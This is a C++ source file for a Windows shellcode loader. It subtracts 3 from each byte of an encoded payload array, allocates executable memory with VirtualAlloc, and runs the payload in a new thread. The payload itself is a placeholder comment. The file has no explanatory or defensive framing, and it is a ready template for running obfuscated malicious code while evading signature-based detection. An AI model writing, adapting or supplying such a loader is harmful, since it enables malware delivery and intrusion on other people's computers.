#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

BYTE shellcode[] = {
    // Your Caesar-encrypted shellcode here
};

// Function to decrypt Caesar-encrypted shellcode
void decryptShellcode(BYTE* shellcode, int size) {
    // Iterate through each byte of the shellcode
    for (int i = 0; i < size; i++) {
        // Perform Caesar decryption with a fixed iteration of 3
        shellcode[i] -= 3;
    }
}

int main() {
    // Decrypt the shellcode
    decryptShellcode(shellcode, sizeof(shellcode));

    // Allocate memory for the shellcode
    LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (shellcodeAddr == NULL) {
        std::cerr << "VirtualAlloc failed: " << GetLastError() << std::endl;
        return 1;
    }

    // Copy the decrypted shellcode to the allocated memory
    memcpy(shellcodeAddr, shellcode, sizeof(shellcode));

    // Create a thread to execute the shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "CreateThread failed: " << GetLastError() << std::endl;
        VirtualFree(shellcodeAddr, 0, MEM_RELEASE);
        return 1;
    }

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFree(shellcodeAddr, 0, MEM_RELEASE);

    return 0;
}
